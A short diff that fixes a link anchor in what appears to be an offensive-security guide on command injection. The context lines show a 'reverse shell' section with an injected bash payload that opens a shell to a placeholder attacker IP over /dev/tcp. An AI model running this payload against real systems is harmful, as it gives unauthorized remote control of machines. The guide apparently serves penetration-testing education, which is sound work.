@@ -232,7 +232,7 @@ Check Network & Connections
   && netstat -an
 ````
 Get a Reverse Shell (Full Access)
-If outbound connections are allowed, you can get a reverse shell, with [netcat](####netcat-reverse-shell)
+If outbound connections are allowed, you can get a reverse shell, with [netcat](#netcat-reverse-shell)
 ````bash
   #If nc is unavailable, try:
   ; bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1
